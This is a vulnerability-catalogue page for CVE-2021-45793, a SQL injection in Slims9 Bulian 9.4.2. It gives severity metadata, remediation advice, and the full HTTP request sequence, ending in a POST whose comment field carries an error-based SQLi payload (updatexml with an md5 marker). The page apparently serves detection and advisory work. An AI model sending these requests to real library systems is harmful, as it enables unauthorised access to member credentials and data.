---
layout: post
cve_id: CVE-2021-45793
title: Slims9 Bulian 9.4.2 - SQL Injection
pcap: true
pcap_path: /pcaps/2021/CVE-2021-45793.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-45793.yaml
snort2_rule: N/A
snort3_rule: N/A
author: nblirwn
severity: high
impact: 'Authenticated attackers can exploit SQL injection in the comment field to
  extract database contents including user credentials and sensitive library data.

  '
remediation: 'Upgrade to Slims9 Bulian version 9.4.3 or later.

  '
reference:
- https://github.com/slims/slims9_bulian/issues/123
- https://nvd.nist.gov/vuln/detail/CVE-2021-45793
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2021-45793
  cwe-id: CWE-89
  epss-score: 0.11747
  epss-percentile: 0.93469
  cpe: cpe:2.3:a:slims:senayan_library_management_system:9.4.2:*:*:*:*:*:*:*
metadata:
  max-request: 3
  vendor: slims
  product: senayan_library_management_system
tags:
- cve2021
- cve
- slims
- sqli
- vuln
---

## üîç Vulnerability Description
Slims9 Bulian 9.4.2 is affected by SQL injection in lib/comment.inc.php. User data can be obtained.


## üåê HTTP Request
```nohighlight
GET /index.php?p=member&destination HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /index.php?p=member&destination HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15
Connection: close
Content-Length: 77
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
memberID=JNuK1G&memberPassWord=vicPDR&_csrf_token_bima8S=khEtHa&logMeIn=Login
```

```nohighlight
GET /index.php?p=show_detail&id=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /index.php?p=show_detail&id=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Connection: close
Content-Length: 171
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
comment=%27and%2F**%2F1%3D%28updatexml%281%2Cconcat%280x3a%2Cmd5%288749%29%29%2C1%29%29%2F**%2Fand%2F**%2F%271%27%3D%271&SaveComment=Save+comment&_csrf_token_bima8S=8aWpHP
```

